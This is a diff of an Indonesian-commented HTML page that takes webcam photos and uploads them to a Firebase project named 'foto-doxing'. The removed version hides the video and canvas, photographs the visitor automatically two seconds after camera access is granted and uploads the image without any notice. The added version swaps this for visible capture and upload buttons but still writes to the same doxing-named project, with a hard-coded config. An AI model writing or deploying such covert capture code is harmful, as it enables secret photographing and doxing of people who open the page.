@@ -1,81 +1,91 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Upload Foto ke Firebase</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Upload Foto</title>
 </head>
 <body>
-  <h2>📸 Foto otomatis lalu tersimpan ke Firebase</h2>
-  <canvas id="canvas" width="300" height="300" style="display:none;"></canvas>
-  <div id="status">Menunggu kamera...</div>
+  
+  <h2>Ambil Foto dari Kamera</h2>
+  <video id="video" width="300" autoplay></video>
+  <button id="capture">📸 Ambil Foto</button>
+  <canvas id="canvas" width="300" height="200"></canvas>
+  <button id="upload">⬆️ Upload ke Firebase</button>
 
-  <!-- Firebase SDK (pakai CDN versi modular) -->
+  <!-- Firebase SDK -->
   <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
-    import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-storage.js";
-    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
+    
+    // Import Firebase
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+    import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-storage.js";
+    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
 
-    // 🔹 Config Firebase kamu
+    // Konfigurasi Firebase (punya kamu tempel di sini)
     const firebaseConfig = {
       apiKey: "AIzaSyCI0i2fIl-B7wMPvhyxxZdfPLKEe-nOlVQ",
       authDomain: "foto-doxing.firebaseapp.com",
       projectId: "foto-doxing",
-      storageBucket: "foto-doxing.firebasestorage.app",
+      storageBucket: "foto-doxing.appspot.com",
       messagingSenderId: "839479538330",
       appId: "1:839479538330:web:9e5bef4e323cf96b3e2523",
       measurementId: "G-9X78MHZW9W"
     };
 
-    // 🔹 Inisialisasi Firebase
+    // Initialize Firebase
     const app = initializeApp(firebaseConfig);
     const storage = getStorage(app);
     const db = getFirestore(app);
 
-    // 🔹 Ambil kamera user
+    // === KAMERA ===
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
+    const captureBtn = document.getElementById("capture");
+    const uploadBtn = document.getElementById("upload");
+
+    // Nyalakan kamera
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
-        const video = document.createElement("video");
-        video.style.display = "none";
-        document.body.appendChild(video);
         video.srcObject = stream;
-        video.play();
-
-        video.onloadedmetadata = () => {
-          setTimeout(() => {
-            const canvas = document.getElementById("canvas");
-            const ctx = canvas.getContext("2d");
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            // Convert canvas ke Blob (file gambar)
-            canvas.toBlob(async (blob) => {
-              try {
-                const fileName = "foto_" + Date.now() + ".png";
-                const storageRef = ref(storage, "uploads/" + fileName);
-
-                // Upload ke Firebase Storage
-                await uploadBytes(storageRef, blob);
-                const downloadURL = await getDownloadURL(storageRef);
-
-                // Simpan link ke Firestore
-                await addDoc(collection(db, "foto_users"), {
-                  url: downloadURL,
-                  timestamp: serverTimestamp()
-                });
-
-                document.getElementById("status").innerText = "✅ Foto berhasil diupload!";
-              } catch (error) {
-                document.getElementById("status").innerText = "❌ Gagal upload: " + error;
-              }
-            }, "image/png");
-
-            // Stop kamera
-            stream.getTracks().forEach(track => track.stop());
-          }, 2000); // foto diambil setelah 2 detik
-        };
       })
       .catch(err => {
-        document.getElementById("status").innerText = "❌ Kamera diblokir: " + err;
+        console.error("Kamera error:", err);
       });
+
+    // Ambil foto
+    captureBtn.addEventListener("click", () => {
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    });
+
+    // Upload ke Firebase Storage + simpan link di Firestore
+    uploadBtn.addEventListener("click", () => {
+      canvas.toBlob(async (blob) => {
+        const fileName = "foto_" + Date.now() + ".png";
+        const storageRef = ref(storage, "uploads/" + fileName);
+
+        try {
+          // Upload ke Storage
+          await uploadBytes(storageRef, blob);
+
+          // Ambil link download
+          const url = await getDownloadURL(storageRef);
+
+          // Simpan ke Firestore
+          await addDoc(collection(db, "photos"), {
+            url: url,
+            createdAt: serverTimestamp()
+          });
+
+          alert("✅ Foto berhasil diupload & link tersimpan di Firestore!");
+          console.log("Download URL:", url);
+        } catch (error) {
+          console.error("Upload gagal:", error);
+        }
+      }, "image/png");
+    });
+    
   </script>
 </body>
+  
 </html>
